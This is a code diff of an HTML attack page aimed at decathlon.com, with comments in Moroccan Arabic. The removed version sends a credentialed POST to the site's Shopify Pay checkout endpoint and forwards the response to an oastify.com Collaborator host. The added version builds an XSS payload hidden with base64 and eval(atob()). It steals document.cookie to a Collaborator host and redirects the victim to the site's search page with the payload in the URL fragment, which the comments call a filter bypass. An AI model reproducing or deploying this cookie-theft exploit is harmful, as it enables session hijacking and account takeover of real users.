@@ -1,11 +1,25 @@
-<script>
-    fetch("https://www.decathlon.com/shopify_pay/accelerated_checkout", {
-        method: "POST",
-        credentials: "include" // هادي هي اللي كتجر الكوكيز ديال الضحية
-    })
-    .then(r => r.text())
-    .then(data => {
-        // هنا كنصيفطو "الغنيمة" لعندك لـ Collaborator
-        fetch("https://fra0o9ys6n7zg023be331an2ltrkfh36.oastify.com/?exfil=" + btoa(data));
-    });
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // الكود اللي كيهز الكوكيز ويصيفطهم لـ Collaborator
+        let collab = "r4wc1lb4jzkbtcffoqgfem0ey54wsugj.oastify.com/?exfil=";
+        let script = "var i=new Image(); i.src='" + collab + "' + btoa(document.cookie);";
+        
+        // تشفير الكود بـ Base64
+        let payload = btoa(script);
+
+        // محاولة الخروج من الـ String (The Bypass)
+        let targetPayload = "'-eval(atob('" + payload + "'))-'";
+
+        // بناء الرابط باستعمال ال# لضمان تجاوز الـ Filter
+        let target = "https://www.decathlon.com/search?q=test#" + encodeURIComponent(targetPayload);
+
+        // تحويل المتصفح للهدف
+        window.location.href = target;
+    </script>
+</body>
+</html>
